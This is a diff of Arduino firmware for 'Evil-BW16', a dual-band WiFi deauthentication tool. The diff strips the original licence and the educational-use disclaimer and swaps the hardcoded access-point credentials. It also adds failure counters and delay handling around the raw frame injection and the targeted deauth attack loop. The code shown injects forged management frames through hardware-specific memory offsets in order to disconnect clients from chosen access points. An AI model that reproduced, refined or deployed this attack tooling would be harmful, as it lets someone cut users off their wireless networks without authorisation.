@@ -1,34 +1,3 @@
-/*
-   Evil-BW16 - WiFi Dual band deauther
-
-   Copyright (c) 2024 7h30th3r0n3
-
-   Permission is hereby granted, free of charge, to any person obtaining a copy
-   of this software and associated documentation files (the "Software"), to deal
-   in the Software without restriction, including without limitation the rights
-   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-   copies of the Software, and to permit persons to whom the Software is
-   furnished to do so, subject to the following conditions:
-
-   The above copyright notice and this permission notice shall be included in all
-   copies or substantial portions of the Software.
-
-   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-   SOFTWARE.
-
-   Disclaimer:
-   This tool, Evil-BW16, is developed for educational and ethical testing purposes only.
-   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-BW16
-   assumes no liability and is not responsible for any misuse or damage caused by this tool.
-   Users are required to comply with all applicable laws and regulations in their jurisdiction
-   regarding network testing and ethical hacking.
-*/
-
 #define NOMINMAX  // Prevent Windows min/max macros from interfering with STL
 #include <vector>
 #include <Arduino.h>
@@ -49,8 +18,8 @@
 //==========================
 // User Configuration
 //==========================
-#define WIFI_SSID       "7h30th3r0n35Ghz"
-#define WIFI_PASS       "5Ghz7h30th3r0n3Pass"
+#define WIFI_SSID       "lola"
+#define WIFI_PASS       "1234567890"
 #define WIFI_CHANNEL    1
 
 bool USE_LED = true;
@@ -204,7 +173,8 @@ void sendResponse(const String& response) {
     static unsigned long lastSend = 0;
     unsigned long currentTime = millis();
     if (currentTime - lastSend < 25) { // Minimum 25ms between sends
-        return;
+        delay(26 - (currentTime - lastSend)); // ponytail: wait out the window instead of dropping the line; ceiling: slows bursts, upgrade path is a TX queue
+        currentTime = millis();
     }
     lastSend = currentTime;
 
@@ -517,6 +487,8 @@ unsigned long last_disassoc_attack = 0;
 //==========================================================
 // Raw Frame Injection
 //==========================================================
+volatile uint32_t tx_fail_count = 0;  // alloc_mgtxmitframe failures since boot
+volatile uint32_t ch_fail_count = 0;  // wifi_set_channel failures since boot
 void wifi_tx_raw_frame(void* frame, size_t length) {
   uint8_t *ptr = (uint8_t *)**(uint32_t **)(rltk_wlan_info + 0x10);
   uint8_t *frame_control = (uint8_t *)alloc_mgtxmitframe(ptr + 0xae0);
@@ -529,6 +501,8 @@ void wifi_tx_raw_frame(void* frame, size_t length) {
     *(uint32_t *)(frame_control + 0x14) = length;
     *(uint32_t *)(frame_control + 0x18) = length;
     dump_mgntframe(ptr, frame_control);
+  } else {
+    tx_fail_count++;  // frame never left the radio
   }
 }
 
@@ -1155,6 +1129,8 @@ void handleCommand(String command) {
     sendResponse("[INFO] Cycle Delay: " + String(cycle_delay) + " ms");
     sendResponse("[INFO] Scan Time: " + String(scan_time) + " ms");
     sendResponse("[INFO] Number of Frames per AP: " + String(num_send_frames));
+    sendResponse("[INFO] TX alloc failures: " + String(tx_fail_count));
+    sendResponse("[INFO] Channel-set failures: " + String(ch_fail_count));
     sendResponse("[INFO] Start Channel: " + String(start_channel));
     sendResponse("[INFO] Scan between attack cycles: " + String(scan_between_cycles ? "Enabled" : "Disabled"));
     sendResponse("[INFO] LEDs: " + String(USE_LED ? "On" : "Off"));
@@ -1247,7 +1223,7 @@ void targetAttack() {
   if (target_mode && attack_enabled) {
     sendResponse("[INFO] Targeted attack started.");
     for (size_t i = 0; i < target_aps.size(); i++) {
-      wifi_set_channel(target_aps[i].channel);
+      if (wifi_set_channel(target_aps[i].channel) != 0) ch_fail_count++;
       for (unsigned long j = 0; j < num_send_frames; j++) {
         wifi_tx_deauth_frame(target_aps[i].bssid, dst_mac, 2);
         if (USE_LED) {
